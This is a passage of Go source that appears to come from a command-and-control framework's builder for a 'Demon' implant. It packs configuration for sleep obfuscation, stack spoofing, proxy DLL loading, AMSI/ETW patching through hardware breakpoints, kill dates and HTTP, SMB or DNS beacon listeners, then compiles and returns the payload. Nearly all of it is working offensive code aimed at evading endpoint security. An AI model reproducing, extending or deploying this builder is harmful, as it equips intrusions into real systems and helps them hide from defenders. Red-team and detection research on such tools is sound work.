			b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SLEEPOBF_USE_TIMER")
		}
	} else {
		return nil, errors.New("Sleep Obfuscation technique is undefined")
	}

	if val, ok := b.config.Config["Sleep Jmp Gadget"].(string); ok && len(val) > 0 {

		if ConfigObfTechnique != SLEEPOBF_NO_OBF {
			switch val {
			case "jmp rax":
				ConfigObfBypass = SLEEPOBF_BYPASS_JMPRAX
				if !b.silent {
					b.SendConsoleMessage("Info", "Sleep Jump Gadget: \"jmp rax\"")
				}
				break

			case "jmp rbx":
				ConfigObfBypass = SLEEPOBF_BYPASS_JMPRBX
				if !b.silent {
					b.SendConsoleMessage("Info", "Sleep Jump Gadget: \"jmp rbx\"")
				}
				break

			default:
				ConfigObfBypass = SLEEPOBF_BYPASS_NONE
				if !b.silent {
					b.SendConsoleMessage("Info", "Sleep Jump Gadget: None")
				}
				break
			}
		} else {
			// if no sleep obfuscation technique has been specified then
			// no jmp gadgets are going to be used.
			if !b.silent {
				b.SendConsoleMessage("Info", "Sleep Jump Gadget Option Ignored")
			}
		}

	} else {
		return nil, errors.New("sleep Obfuscation technique is undefined")
	}

	if val, ok := b.config.Config["Stack Duplication"].(bool); ok {
		if ConfigObfTechnique != SLEEPOBF_NO_OBF {
			if val {
				ConfigStackSpoof = win32.TRUE
				if !b.silent {
					b.SendConsoleMessage("Info", "Stack Duplication: Enabled")
				}
			}
		} else {
			// if no sleep obfuscation technique has been specified then
			// stack spoofing is not possible during sleep lol.
			if !b.silent {
				b.SendConsoleMessage("Info", "Stack Duplication: Disabled")
			}
		}
	} else {
		return nil, errors.New("Stack Duplication is undefined")
	}

	if val, ok := b.config.Config["Proxy Loading"].(string); ok && len(val) > 0 {
		switch val {
		case "None (LdrLoadDll)":
			ConfigProxyLoading = PROXYLOADING_NONE
			if !b.silent {
				b.SendConsoleMessage("Info", "Proxy Loading Technique: None (using LdrLoadDll)")
			}
			break

		case "RtlRegisterWait":
			ConfigProxyLoading = PROXYLOADING_RTLREGISTERWAIT
			if !b.silent {
				b.SendConsoleMessage("Info", "Proxy Loading Technique: RtlRegisterWait")
			}
			break

		case "RtlCreateTimer":
			ConfigProxyLoading = PROXYLOADING_RTLCREATETIMER
			if !b.silent {
				b.SendConsoleMessage("Info", "proxy Loading Technique: RtlCreateTimer")
			}
			break

		case "RtlQueueWorkItem":
			ConfigProxyLoading = PROXYLOADING_RTLQUEUEWORKITEM
			if !b.silent {
				b.SendConsoleMessage("Info", "Proxy Loading Technique: RtlQueueWorkItem")
			}
			break

		default:
			ConfigProxyLoading = PROXYLOADING_NONE
			if !b.silent {
				b.SendConsoleMessage("Info", "Proxy Loading Technique: None (using LdrLoadDll)")
			}
			break
		}
	} else {
		return nil, errors.New("Proxy Loading is undefined")
	}

	if val, ok := b.config.Config["Amsi/Etw Patch"].(string); ok && len(val) > 0 {
		switch val {

		case "Hardware breakpoints", "HWBP":
			ConfigAmsiPatch = AMSIETW_PATCH_HWBP
			if !b.silent {
				b.SendConsoleMessage("Info", "AMSI/ETW Patch Technique: Hardware Breakpoints")
			}
			break

		default:
			ConfigAmsiPatch = AMSIETW_PATCH_NONE
			if !b.silent {
				b.SendConsoleMessage("Info", "AMSI/ETW Patch Technique: Disabled")
			}
			break
		}
	} else {
		return nil, errors.New("AMSI/ETW Patch Undefined")
	}

	// behaviour configuration (alloc/exec/spawn)
	DemonConfig.AddInt(ConfigAlloc)
	DemonConfig.AddInt(ConfigExecute)
	DemonConfig.AddWString(ConfigSpawn64)
	DemonConfig.AddWString(ConfigSpawn32)

	// bypass techniques
	DemonConfig.AddInt(ConfigObfTechnique)
	DemonConfig.AddInt(ConfigObfBypass)
	DemonConfig.AddInt(ConfigStackSpoof)
	DemonConfig.AddInt(ConfigProxyLoading)
	DemonConfig.AddInt(ConfigSyscall)
	DemonConfig.AddInt(ConfigAmsiPatch)

	// Listener Config
	switch b.config.ListenerType {
	case handlers.LISTENER_HTTP:
		var (
			Config    = b.config.ListenerConfig.(*handlers.HTTP)
			Port, err = strconv.Atoi(Config.Config.PortConn)
		)

		if Config.Config.PortConn != "" && err != nil {
			return nil, errors.New("Failed to parse the PortConn: " + Config.Config.PortConn)
		} else if Config.Config.PortConn == "" {
			Port, err = strconv.Atoi(Config.Config.PortBind)
			if err != nil {
				return nil, errors.New("Failed to parse the PortBind: " + Config.Config.PortBind)
			}
		}

		DemonConfig.AddInt64(Config.Config.KillDate)

		WorkingHours, err := common.ParseWorkingHours(Config.Config.WorkingHours)
		if err != nil {
			return nil, err
		}

		DemonConfig.AddInt32(WorkingHours)

		if strings.ToLower(Config.Config.Methode) == "get" {
			//DemonConfig.AddWString("GET")
			return nil, errors.New("GET method is not supported")
		} else {
			DemonConfig.AddWString("POST")
		}

		switch Config.Config.HostRotation {
		case "round-robin":
			DemonConfig.AddInt(0)
			break

		case "random":
			DemonConfig.AddInt(1)
			break

		default:
			DemonConfig.AddInt(1)
			break
		}

		DemonConfig.AddInt(len(Config.Config.Hosts))
		for _, host := range Config.Config.Hosts {
			var HostPort []string

			logger.Debug(fmt.Sprintf("Host => %v", host))

			HostPort = strings.Split(host, ":")
			host = HostPort[0]
			if len(HostPort) > 1 {
				/* seems like we specified host:port */
				logger.Debug("host:port")

				var (
					Host = HostPort[0]
					Port int
				)

				if val, err := strconv.Atoi(HostPort[1]); err == nil {
					Port = val
				} else {
					logger.Error("Failed convert Port string to int: " + err.Error())
					return nil, err
				}

				/* Adding Host:Port */
				DemonConfig.AddWString(common.GetInterfaceIpv4Addr(Host))
				DemonConfig.AddInt(Port)
			} else {
				/* seems like we specified host only. append the listener bind port to it */
				logger.Debug("host only")

				/* Adding Host:Port */
				DemonConfig.AddWString(common.GetInterfaceIpv4Addr(HostPort[0]))
				DemonConfig.AddInt(Port)
			}
		}

		if Config.Config.Secure {
			DemonConfig.AddInt(win32.TRUE)
		} else {
			DemonConfig.AddInt(win32.FALSE)
		}
		DemonConfig.AddWString(Config.Config.UserAgent)

		if len(Config.Config.Headers) == 0 {
			if len(Config.Config.HostHeader) > 0 {
				DemonConfig.AddInt(2)
				DemonConfig.AddWString("Content-type: */*")
				DemonConfig.AddWString("Host: " + Config.Config.HostHeader)
			} else {
				DemonConfig.AddInt(1)
				DemonConfig.AddWString("Content-type: */*")
			}
		} else {
			if len(Config.Config.HostHeader) > 0 {
				Config.Config.Headers = append(Config.Config.Headers, "Host: "+Config.Config.HostHeader)
			}

			DemonConfig.AddInt(len(Config.Config.Headers))
			for _, headers := range Config.Config.Headers {
				logger.Debug(headers)
				DemonConfig.AddWString(headers)
			}
		}

		if len(Config.Config.Uris) == 0 {
			DemonConfig.AddInt(1)
			DemonConfig.AddWString("/")
		} else {
			DemonConfig.AddInt(len(Config.Config.Uris))
			for _, uri := range Config.Config.Uris {
				logger.Debug(uri)
				DemonConfig.AddWString(uri)
			}
		}

		// adding proxy connection info
		if Config.Config.Proxy.Enabled {
			DemonConfig.AddInt(win32.TRUE)
			var ProxyUrl = fmt.Sprintf("%v://%v:%v", Config.Config.Proxy.Type, Config.Config.Proxy.Host, Config.Config.Proxy.Port)

			DemonConfig.AddWString(ProxyUrl)
			DemonConfig.AddWString(Config.Config.Proxy.Username)
			DemonConfig.AddWString(Config.Config.Proxy.Password)
		} else {
			DemonConfig.AddInt(win32.FALSE)
		}

		// [HVC-026] Auto proxy detection flag — always packed after manual proxy block
		DemonConfig.AddInt(ConfigAutoProxy)

		break

	case handlers.LISTENER_PIVOT_SMB:
		var Config = b.config.ListenerConfig.(*handlers.SMB)

		DemonConfig.AddWString("\\\\.\\pipe\\" + Config.Config.PipeName)

		DemonConfig.AddInt64(Config.Config.KillDate)

		WorkingHours, err := common.ParseWorkingHours(Config.Config.WorkingHours)
		if err != nil {
			logger.Error("Failed to parse the WorkingHours: " + err.Error())
			return nil, err
		}

		DemonConfig.AddInt32(WorkingHours)

		break

	case handlers.LISTENER_DNS:
		var Config = b.config.ListenerConfig.(*handlers.DNS)

		// Pack: ZoneDomain (WString), ResolverCount (Int32), Resolvers[]..., Port (Int32), QueryTimeout (Int32), ChunkDelayMs (Int32)
		DemonConfig.AddWString(Config.Config.ZoneDomain)
		DemonConfig.AddInt32(int32(len(Config.Config.Hosts)))
		for _, host := range Config.Config.Hosts {
			DemonConfig.AddWString(host)
		}
		DemonConfig.AddInt32(int32(Config.Config.Port))
		DemonConfig.AddInt32(int32(Config.Config.QueryTimeout))
		DemonConfig.AddInt32(int32(Config.Config.ChunkDelayMs))

		break
	}

	//logger.Debug("DemonConfig:\n" + hex.Dump(DemonConfig.Buffer()))

	return DemonConfig.Buffer(), nil
}

func (b *Builder) GetPayloadBytes() []byte {

	if len(b.preBytes) > 0 {
		b.SendConsoleMessage("Good", "Payload Generated")
		return b.preBytes
	}

	var (
		FileBuffer []byte
		err        error
	)

	if b.outputPath == "" {
		logger.Error("Output Path Empty")
		if !b.silent {
			b.SendConsoleMessage("Error", "Output Path Empty")
		}
		return nil
	}

	FileBuffer, err = os.ReadFile(b.outputPath)
	if err != nil {
		logger.Error("Couldn't Read Content of File: " + err.Error())
		if !b.silent {
			b.SendConsoleMessage("Error", "Couldn't Read Content of File: "+err.Error())
		}
		return nil
	}

	if b.PatchBinary {
		FileBuffer = b.Patch(FileBuffer)
	}

	if !b.silent {
		b.SendConsoleMessage("Good", "Payload Generated")
	}

	return FileBuffer
}

func (b *Builder) Cmd(cmd string) bool {
	// In tests a fake runner is injected so we don't need the real cross-compiler.
	if b.testCmdRunner != nil {
		ok, errOut := b.testCmdRunner(cmd)
		if !ok {
			logger.Error("Couldn't Compile implant (test runner): " + errOut)
			if !b.silent {
				b.SendConsoleMessage("Error", "Couldn't Compile implant: "+errOut)
				b.SendConsoleMessage("Error", "Compile Output: "+errOut)
			}
		}
		return ok
	}

	var (
		Command = exec.Command("sh", "-c", cmd)
		stdout  bytes.Buffer
		stderr  bytes.Buffer
		err     error
	)

	Command.Dir = b.sourcePath
	Command.Stdout = &stdout
	Command.Stderr = &stderr

	err = Command.Run()
	if err != nil {
		logger.Error("Couldn't Compile implant: " + err.Error())
		if !b.silent {
			b.SendConsoleMessage("Error", "Couldn't Compile implant: "+err.Error())
			b.SendConsoleMessage("Error", "Compile Output: "+stderr.String())
		}
		logger.Debug(cmd)
		logger.Debug("StdErr:\n" + stderr.String())
		return false
	}
	return true
}

func (b *Builder) CompileCmd(cmd string) bool {

	if b.Cmd(cmd) {
		if !b.silent {
			b.SendConsoleMessage("Info", "Finished Compiling Source")
		}
		return true
	}

	return false
}

func (b *Builder) GetListenerDefines() []string {
	var defines []string

	switch b.config.ListenerType {

	case handlers.LISTENER_HTTP:

		defines = append(defines, "TRANSPORT_HTTP")
		break

	case handlers.LISTENER_PIVOT_SMB:

		defines = append(defines, "TRANSPORT_SMB")
		break

	case handlers.LISTENER_DNS:

		defines = append(defines, "TRANSPORT_DNS")
		break

	}

	return defines
}

func (b *Builder) DeletePayload() {
	b.FilesCreated = append(b.FilesCreated, b.outputPath)
	b.FilesCreated = append(b.FilesCreated, b.CompileDir)
	for _, FileCreated := range b.FilesCreated {
		if strings.HasSuffix(FileCreated, ".bin") == false {
			if err := os.Remove(FileCreated); err != nil {
				logger.Debug("Couldn't remove " + FileCreated + ": " + err.Error())
			}
		}
	}
}
